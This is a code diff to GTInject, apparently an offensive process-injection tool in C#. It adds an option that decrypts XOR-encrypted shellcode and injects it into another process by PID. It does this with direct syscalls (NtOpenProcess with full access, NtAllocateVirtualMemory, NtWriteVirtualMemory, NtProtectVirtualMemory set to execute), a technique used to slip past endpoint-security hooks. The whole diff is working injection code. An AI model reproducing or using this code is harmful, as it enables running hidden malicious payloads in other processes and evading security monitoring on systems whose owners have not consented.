@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Runtime.CompilerServices;
 using System.Net.NetworkInformation;
 using System.Security.Cryptography;
+using GTInject.SysCalls;
 
 namespace GTInject.memoryOptions
 {
@@ -19,6 +20,8 @@ namespace GTInject.memoryOptions
                     return memopt200(binsrctype, binsrcpath, xorkey, pid);
                 case 201:
                     return memopt201(binsrctype, binsrcpath, xorkey, pid);
+                case 300:
+                    return memopt300(binsrctype, binsrcpath, xorkey, pid);
                 default:
                     Console.WriteLine("[-] Not a valid memory allocation option integer");
                     return (IntPtr.Zero, null);
@@ -153,6 +156,43 @@ namespace GTInject.memoryOptions
             return (baseAddress, remoteProc);
         }
 
+        private static (IntPtr, Process) memopt300(string binLocation, string bytePath, string xorkey, int ProcID)
+        {
+            /////////////////////////////////////
+            // OPTION 300 == Direct Syscalls NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
+            /////////////////////////////////////
+
+            Console.WriteLine("     Allocate memory using Direct Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");
+
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            Process remoteProc = Process.GetProcessById(ProcID);
+            // set up the syscall for NtOpenProcess
+            WinNative.CLIENT_ID cID = new WinNative.CLIENT_ID();
+            cID.UniqueProcess = (IntPtr)(UInt32)ProcID;
+            WinNative.OBJECT_ATTRIBUTES oAttr = new WinNative.OBJECT_ATTRIBUTES();
+
+            IntPtr hProcess = IntPtr.Zero; var status = Syscalls.SysclNtOpenProcess(ref hProcess, 0x001F0FFF, ref oAttr, ref cID);
+
+            // set up the syscall for NtAllocateVirtualMemory
+            IntPtr baseAddress = IntPtr.Zero;
+            IntPtr regionSize = (IntPtr)(plainBytes.Length);
+            status = Syscalls.SysclNtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)(MemoryProtection.ReadWrite));
+            Console.WriteLine("     Direct Syscall to Allocate " + status);
+            // set up the syscall for NtWriteVirtualMemory
+            var buffer = Marshal.AllocHGlobal(plainBytes.Length);
+            Marshal.Copy(plainBytes, 0, buffer, plainBytes.Length);
+            uint bytesWritten = 0;
+            status = Syscalls.SysclNtWriteVirtualMemory(hProcess, baseAddress, buffer, (uint)plainBytes.Length, ref bytesWritten);
+            Console.WriteLine("     Direct Syscall to Write " + status);
+            Marshal.FreeHGlobal(buffer);
+
+            // set up the syscall for NtProtectVirtualMemory
+            uint oldProtect = 0;
+            status = Syscalls.SysclNtProtectVirtualMemory(hProcess, ref baseAddress, ref regionSize, (uint)MemoryProtection.ExecuteRead, ref oldProtect);
+            Console.WriteLine("     Direct Syscall to vProt " + status);
+
+            return (baseAddress, remoteProc);
+        }
         /////////////////////////////////////
         // Supporting functions
         /////////////////////////////////////
